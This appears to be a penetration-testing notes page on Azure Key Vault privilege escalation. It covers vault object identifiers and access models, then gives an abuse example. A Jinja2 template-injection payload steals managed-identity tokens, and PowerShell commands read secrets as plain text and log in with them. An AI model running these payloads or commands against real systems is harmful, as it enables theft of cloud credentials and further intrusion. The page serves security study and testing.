---
title: Key Vault
source_url: https://notes.incendium.rocks/pentesting-notes/cloud/azure/privilege-escalation/key-vault
fetched_at: 2026-09-20T01:23:21Z
license: unspecified
category: cloud
---

Key vault is Azure's service for storing secrets such as passwords, connection strings, certificates, private keys etc. With the right permissions and access, Azure resources that support managed identities (VM's App service, Functions, containers). can securely retrieve secrets from the key vault.

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2FiczGBh2Cbih154Hpg0XJ%2Fazure-key-vault.png?alt=media&amp;token=5c171003-b99a-4538-8124-b257e56bcb5e" alt="" width="375"><figcaption></figcaption></figure>

### Identifier

Objects in a key vault are identified using a Object identifier URL. The base URL is of the format:

```http
https://{vault-name}.vault.azure.net/{object-type}/{object-name}/{object-version}
```

The vault-name is globally unique. And the object-type can be "keys", "secrets" or "certificates".

### Access to key vaults

Key Vaults support RBAC and access policies. So for role assignments, a application can have the "Key Vault Secrets User" or "Key Vault Administrator".

Do not use access policies for key vaults from a defense perspective! This is because access policies can be edited by other roles other than the owner of the key vault, such as contributor.

If we can compromise an azure resource whose managed identity can read secrets from a key vault, it may be possible to gain access to more resources. Note that each secret has its own IAM inherited from the key vault.

**Roles who can access secrets**

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2FijEK78LX56VcgN1c2sKM%2Fimage.png?alt=media&amp;token=eaf2d694-2a60-4c70-aca4-91a5f1950a4f" alt=""><figcaption></figcaption></figure>

### Abuse example

We have a App Service that is vulnerable to Jinja2 SSTI. We get a access token from vault.azure.net:

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER').read() }}
```

Also, we will need to get a access\_token for ARM:

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER').read() }}
```

We connect with Az Cli using both tokens:

```powershell
Connect-AzAccount -AccessToken $armtoken -AccountId 2e91a4fe-a0f2-46ee-8214-xxx -KeyVaultToken $token
```

Next, check if we have at least a reader role on a key vault:

```powershell
Get-AzKeyVault

Vault Name          : vault
Resource Group Name : Research
Location            : germanywestcentral
```

Check if we can read Secrets:

```powershell
Get-AzKeyVaultSecret -VaultName vault

Vault Name   : researchkeyvault
Name         : Reader
Version      :
Id           : https://vault.vault.azure.net:443/secrets/Reader
Enabled      : True
Expires      :
Not Before   :
Created      : 1/7/2025 8:04:22 AM
Updated      : 1/7/2025 8:04:22 AM
Content Type :
Tags         :
```

Finally, extract secret as plain text:

```powershell
Get-AzKeyVaultSecret -VaultName xxx -Name Reader -AsPlainText
username: xx@xxx.onmicrosoft.com ; password: Password123!
```

Use it to connect to Az Cli:

```powershell
$passwd = ConvertTo-SecureString "Password123" -AsPlainText -Force
$creds =  New-Object System.management.automation.pscredential ("xx@xx.onmicrosoft.com", $passwd)
Connect-AzAccount  -Credential $creds
```
